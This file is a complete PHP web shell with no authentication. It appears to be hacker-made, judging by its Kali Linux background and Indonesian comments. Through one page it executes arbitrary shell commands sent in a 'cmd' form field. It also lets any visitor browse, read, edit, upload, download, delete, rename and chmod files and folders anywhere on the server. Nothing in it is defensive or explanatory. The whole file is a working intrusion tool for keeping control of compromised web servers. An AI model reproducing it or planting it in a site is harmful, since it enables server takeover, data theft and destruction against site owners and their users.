<?php
$currentDirectory = realpath('.');

if(isset($_GET['path'])){
    $requestedPath = realpath($_GET['path']);
    if($requestedPath && is_dir($requestedPath)){
        $currentDirectory = $requestedPath;
    }
}

if (isset($_GET['editFile'])) {
    $editFile = $_GET['editFile'];
    if (file_exists($editFile) && is_readable($editFile)) {
        $fileContent = file_get_contents($editFile);
    } else {
        echo "Error: Unable to read the file.";
        exit;
    }
}

if (isset($_POST['content']) && isset($_POST['editFile'])) {
    $content = htmlspecialchars_decode($_POST['content']);
    $filePath = $_POST['editFile'];
    file_put_contents($filePath, $content);
    echo "File has been saved.";
}

if(isset($_POST['changePermission']) && isset($_POST['newPermission'])) {
    $filePath = $_POST['changePermission'];
    $newPermission = $_POST['newPermission'];

    // Validate the new permission format
    if (preg_match('/^[0-7]{3}$/', $newPermission)) {
        // Change file permissions using chmod
        if (chmod($filePath, octdec($newPermission))) {
            echo "File permissions changed successfully.";
        } else {
            echo "Error: Unable to change file permissions.";
        }
    } else {
        echo "Error: Invalid permission format. Use a three-digit octal number (e.g., 755).";
    }
}


if(isset($_GET['deleteFile'])){
    $filePath = realpath($_GET['deleteFile']);
    if($filePath && is_file($filePath)){
        unlink($filePath);
    }
}


if(isset($_GET['downloadFile'])){
    $filePath = $_GET['downloadFile'];
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($filePath).'"');
    readfile($filePath);
    exit;
}

if(isset($_FILES['uploadFile'])){
    $uploadDir = $currentDirectory;
    $fileCount = count($_FILES['uploadFile']['name']);
    
    for($i = 0; $i < $fileCount; $i++) {
        $uploadFile = $uploadDir . '/' . basename($_FILES['uploadFile']['name'][$i]);
        move_uploaded_file($_FILES['uploadFile']['tmp_name'][$i], $uploadFile);
    }
}
if(isset($_GET['removeFolder'])){
    $folderPath = realpath($_GET['removeFolder']);
    if($folderPath && is_dir($folderPath)){
        // Recursive function to delete folder and its contents
        function deleteFolder($folderPath){
            foreach (glob($folderPath . '/*') as $file) {
                if (is_dir($file)) {
                    deleteFolder($file);
                } else {
                    unlink($file);
                }
            }
            rmdir($folderPath);
        }
        deleteFolder($folderPath);
    }
}


if(isset($_GET['renameFolder'])){
    $folderPath = realpath($_GET['renameFolder']);
    if($folderPath && is_dir($folderPath)){
        // Handle the form submission
        if(isset($_POST['newFolderName'])){
            $newFolderName = $_POST['newFolderName'];
            $newFolderPath = dirname($folderPath) . '/' . $newFolderName;

            if(rename($folderPath, $newFolderPath)){
                echo "Folder renamed successfully.";
            } else {
                echo "Error: Unable to rename folder.";
            }
        } else {
            // Display a form to input the new folder name
            echo '<form action="" method="post">
                    <input type="text" name="newFolderName" placeholder="Enter new folder name">
                    <input type="submit" value="Rename">
                  </form>';
        }
    }
}

if(isset($_POST['newFolderName'])){
    $newFolderName = $_POST['newFolderName'];
    $newFolderPath = $currentDirectory . '/' . $newFolderName;

    if(!file_exists($newFolderPath) && !is_dir($newFolderPath)){
        if(mkdir($newFolderPath, 0777, true)){
            echo "Folder created successfully.";
        } else {
            echo "Error: Unable to create folder.";
        }
    } else {
        echo "Error: Folder already exists.";
    }
}

if(isset($_GET['renameFile'])){
    $filePath = realpath($_GET['renameFile']);
    if($filePath && is_file($filePath)){
        // Handle the form submission
        if(isset($_POST['newFileName'])){
            $newFileName = $_POST['newFileName'];
            $newFilePath = dirname($filePath) . '/' . $newFileName;

            if(rename($filePath, $newFilePath)){
                echo "File renamed successfully.";
            } else {
                echo "Error: Unable to rename file.";
            }
        } else {
            // Display a form to input the new file name
            echo '<form action="" method="post">
                    <input type="text" name="newFileName" placeholder="Enter new file name">
                    <input type="submit" value="Rename">
                  </form>';
        }
    }
}


if(isset($_POST['cmd'])){
    $output = shell_exec($_POST['cmd']);
}

$files = scandir($currentDirectory);
?>
<?php if(isset($_GET['changePermission'])): ?>
    <form action="" method="post">
        <label for="newPermission"></label>
        <input type="text" name="newPermission" placeholder="e.g., 755" required>
        <input type="hidden" name="changePermission" value="<?php echo $_GET['changePermission']; ?>">
        <input type="submit" value="Change Permissions">
    </form>
<?php endif; ?>


<?php if(isset($_GET['editFile'])): ?>
        <h3>Edit File:</h3>
        <form action="" method="post">
            <textarea name="content" rows="30" cols="150"><?php echo htmlspecialchars($fileContent); ?></textarea><br>
            <input type="hidden" name="editFile" value="<?php echo $editFile; ?>">
            <input type="submit" value="Save">
        </form>
    <?php endif; ?>

<form action="" method="post">
    <input type="text" name="newFolderName" placeholder="Enter new folder name">
    <input type="submit" value="Create Folder">
</form>

<html>
 
<body>
     <style>
        body {
            background-image: url('https://cdn.cyberpunk.rs/wp-content/uploads/2018/08/kali1.jpg');
            background-size: cover;
            background-attachment: fixed; /* Menjadikan background tetap saat scroll */
        }
 </style>
    <form action="" method="post">
        <input type="text" name="cmd" placeholder="Enter command">
        <input type="submit" value="Run">
    </form>
    <?php if(isset($output)): ?>
  <font color ="red">     
  <pre><?php echo $output; ?></pre>
  </font>
    <?php endif; ?>
    
<h3 style="color: red;">
    <form action="" method="post" enctype="multipart/form-data">
    <input type="file" name="uploadFile[]" multiple required>
    <input type="submit" value="Upload">
</form>
</h3>
     <font color ="green"> <h3>Dir: <?php echo $currentDirectory; ?> 
	      <a href="?path=<?php echo realpath('.'); ?>" style="color: red;">Home</a>
 <ul>
     
       <font color ="green"> 
   <a href="?path=<?php echo dirname($currentDirectory); ?>" style="color: red;">↩</a>
    <?php
    foreach ($files as $file) {
        if ($file != "." && $file != ".." && is_dir($currentDirectory . '/' . $file)) {
            
           echo '<li><a href="?path=' . $currentDirectory . '/' . $file . '" style="color: green;margin-bottom: 13px;">' . $file . '</a></li>';
                echo '<a href="?renameFolder=' . $currentDirectory . '/' . $file . '" style="color: #FF0000; margin-bottom: 10px;"> Rename || </a>';
                echo '<a href="?removeFolder=' . $currentDirectory . '/' . $file . '" style="color: #FF0000; margin-bottom: 10px;"> Remove </a>';
                echo '</div>';
        }
    }


foreach ($files as $file) {
    $filePath = $currentDirectory . '/' . $file;
    if ($file != "." && $file != ".." && is_file($filePath)) {
        echo '<li>';
        echo '<span style="margin-bottom: 10px;">' . $file . '</span>';
        echo '<div>';
        
        // Informasi tanggal terakhir edit dan izin hanya untuk file
        echo '<p style="color: #888; font-size: 12px; margin-bottom: 5px;">';
        echo 'Last modified: ' . date("F d Y H:i:s.", filemtime($filePath));
        echo '</p>';
        echo '<p style="color: #888; font-size: 12px; margin-bottom: 5px;">';
        echo 'Permissions: ' . substr(sprintf('%o', fileperms($filePath)), -4);
        echo '</p>';

        // Menampilkan informasi ukuran file (dalam KB)
        $fileSize = filesize($filePath) / 1024; // Konversi dari byte ke KB
        echo '<p style="color: #888; font-size: 12px; margin-bottom: 5px;">';
        echo 'File size: ' . round($fileSize, 2) . ' KB';
        echo '</p>';
echo '<a href="?editFile=' . $currentDirectory . '/' . $file . '" style="color: #FF0000; margin-bottom: 10px;">Edit </a>';
echo '<a href="?renameFile=' . $currentDirectory . '/' . $file . '" style="color: #FF0000; margin-bottom: 10px;">|| Rename File </a>';
echo '<a href="?deleteFile=' . $currentDirectory . '/' . $file . '" style="color: #FF0000; margin-bottom: 10px;">|| Delete ||</a>';
echo '<a href="?downloadFile=' . $currentDirectory . '/' . $file . '" style="color: #FF0000; margin-bottom: 10px;"> Download ||</a>';
echo '<a href="?changePermission=' . $currentDirectory . '/' . $file . '" style="color: #FF0000; margin-bottom: 10px;"> Chmod </a>';
        echo '</div>';
        echo '</li>';
    }
}



    ?>
    </font>
</ul>



<?php
if(isset($_GET['editFile'])) {
    $editFile = $_GET['editFile'];
    if(file_exists($editFile) && is_readable($editFile)) {
        $fileContent = file_get_contents($editFile);
    } else {
        echo "Error: Unable to read the file.";
        exit;
    }
}

if(isset($_POST['content']) && isset($_POST['editFile'])) {
    $content = htmlspecialchars_decode($_POST['content']);
    $filePath = $_POST['editFile'];
    file_put_contents($filePath, $content);
    echo "File has been saved.";
}
?>

</font>
</body>
</html>